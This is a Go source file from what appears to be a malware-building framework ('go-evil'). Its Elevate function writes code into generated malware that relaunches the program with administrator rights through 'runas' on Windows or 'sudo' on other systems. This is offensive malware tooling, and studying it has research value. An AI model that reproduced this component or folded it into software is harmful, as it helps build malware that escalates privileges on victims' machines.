package systemcommands

import (
	"fmt"

	"github.com/s9rA16Bf4/go-evil/utility/structure/functions"
	"github.com/s9rA16Bf4/go-evil/utility/structure/json"
)

// Tries to do a so-called "regular" elevation of the malwares priviliges
func Elevate(value string, data_object *json.Json_t) []string {
	function_call := "elevate"

	body := []string{"if spine.is_admin{", "spine.log(\"Malware is already elevated\")", "return", "}"}

	if data_object.Target_os == "windows" {
		body = append(body, "out, err := exec.Command(\"runas\", \"/user:administrator\", spine.path).Output()")

	} else {
		body = append(body, "out, err := exec.Command(\"sudo\", spine.path).Output()")
	}

	body = append(body, "if err != nil{", "spine.log(err.Error())", "return", "}", "spine.variable.set(string(out))")

	data_object.Add_go_function(functions.Go_func_t{Name: function_call, Func_type: "", Part_of_struct: "", Return_type: "",
		Parameters: []string{},
		Gut:        body})

	data_object.Add_go_import("github.com/s9rA16Bf4/notify_handler/go/notify")
	data_object.Add_go_import("os")
	data_object.Add_go_import("os/exec")

	return []string{fmt.Sprintf("%s()", function_call)}

}
